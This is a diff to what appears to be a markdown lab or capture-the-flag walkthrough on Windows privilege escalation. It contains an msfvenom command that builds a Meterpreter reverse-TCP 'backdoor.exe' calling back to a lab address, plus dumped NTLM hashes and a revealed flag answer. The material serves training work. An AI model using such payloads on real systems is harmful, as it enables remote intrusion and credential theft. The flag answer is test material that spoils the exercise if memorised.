@@ -148,6 +148,9 @@ ls /root/Desktop/tools/UACME/
 ```bash
 ip -br -c a
 	eth1@if162568  UP  10.10.4.2/24
+```
+
+```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.4.2 LPORT=1234 -f exe > backdoor.exe
 ```
 
@@ -221,7 +224,6 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 
 <details>
 <summary>Reveal Flag - admin NTLM Hash is: 🚩</summary>
-
 
 
 `4d6583ed4cef81c2f2ac3c88fc5f3da6`
